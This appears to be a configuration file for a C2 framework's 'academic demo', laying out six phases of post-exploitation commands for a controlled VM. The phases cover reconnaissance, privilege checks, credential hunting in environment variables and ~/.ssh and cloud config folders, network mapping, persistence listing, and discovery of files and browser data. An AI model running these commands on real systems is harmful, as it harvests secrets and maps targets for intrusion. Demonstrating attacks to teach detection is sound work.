name: 2026 Comprehensive Demonstration Suite
description: Multi-stage adversary simulation for academic presentation demonstrating reconnaissance, privilege escalation, lateral movement, and exfiltration in a controlled VM environment
author: SecureComm C2 - Academic Demo

commands.payload: echo '=== PHASE 1: INITIAL RECONNAISSANCE ==='; whoami; hostname; uname -a 2>/dev/null || systeminfo | head -10; echo '--- Network Interfaces ---'; ip addr 2>/dev/null || ipconfig /all 2>/dev/null | head -20
commands.demo_note: Shows attacker gathering baseline system information

demo_phases.name: Privilege Discovery
demo_phases.description: Checking current privileges and escalation vectors

commands.payload: echo '=== PHASE 2: PRIVILEGE DISCOVERY ==='; id 2>/dev/null || whoami /all 2>/dev/null; echo '--- Sudo Rights ---'; sudo -l 2>/dev/null || echo 'No sudo access'; echo '--- Running as Admin ---'; net session 2>/dev/null && echo 'ADMIN PRIVILEGES' || echo 'Standard user'; echo '--- Interesting Files ---'; ls -la /etc/passwd /etc/shadow 2>/dev/null | head -5
commands.description: Privilege enumeration and escalation opportunity identification
commands.demo_note: Demonstrates privilege detection in both Linux and Windows contexts

demo_phases.name: Credential & Token Discovery
demo_phases.description: Hunting for credentials and access tokens

commands.payload: echo '=== PHASE 3: CREDENTIAL DISCOVERY ==='; env | grep -E 'KEY|TOKEN|SECRET|PWD|PASS' | head -10; echo '--- SSH Keys ---'; ls -la ~/.ssh/ 2>/dev/null | head -5; echo '--- Cloud Credentials ---'; ls -la ~/.aws/ ~/.azure/ ~/.config/gcloud/ 2>/dev/null | head -10; cat ~/.gitconfig 2>/dev/null | grep -E 'token|password' | head -5
commands.description: Environment variable and credential file enumeration
commands.demo_note: Shows how attackers discover credentials in environment and config files

demo_phases.name: Network Discovery
demo_phases.description: Internal network mapping and connection analysis

commands.payload: echo '=== PHASE 4: NETWORK DISCOVERY ==='; netstat -tunap 2>/dev/null | head -15 || netstat -ano 2>/dev/null | head -15; echo '--- ARP Table ---'; arp -a 2>/dev/null | head -10; echo '--- Active Connections ---'; ss -tuln 2>/dev/null | head -10 || netstat -an | findstr 'LISTENING' 2>/dev/null | head -10
commands.demo_note: Demonstrates network reconnaissance for lateral movement planning

demo_phases.name: Persistence Check
demo_phases.description: Evaluating persistence mechanisms already in place

commands.payload: echo '=== PHASE 5: PERSISTENCE ENUMERATION ==='; crontab -l 2>/dev/null || echo 'No user crontab'; echo '--- System Cron ---'; ls -la /etc/cron.d/ 2>/dev/null | head -5; echo '--- Startup Items ---'; reg query 'HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run' 2>/dev/null | head -10 || ls -la /etc/init.d/ 2>/dev/null | head -5; echo '--- Scheduled Tasks ---'; schtasks /query /fo LIST 2>/dev/null | head -15 || systemctl list-timers --all 2>/dev/null | head -10
commands.demo_note: Shows existing persistence for operational security assessment

commands.payload: echo '=== PHASE 6: DATA DISCOVERY ==='; find /home -maxdepth 2 -name '*.txt' -o -name '*.pdf' -o -name '*.doc*' 2>/dev/null | head -15; echo '--- Database Files ---'; find / -name '*.db' -o -name '*.sqlite' -o -name '*.sql' 2>/dev/null | head -10; echo '--- Log Files ---'; ls -la /var/log/ 2>/dev/null | head -10 || dir C:\Windows\Logs 2>/dev/null | head -10; echo '--- Browser Data ---'; ls -la ~/.mozilla/firefox/*/ 2>/dev/null | head -5
commands.demo_note: Demonstrates data discovery for exfiltration target selection

presentation_flow.narrative: Complete adversary simulation from initial access to data discovery
audience_engagement: Show detection opportunities at each phase

demo_environment_requirements.preparation: Pre-populate some fake credentials and documents for realistic discovery

audit_note: Purpose-built for academic presentation - demonstrates full kill chain in controlled environment
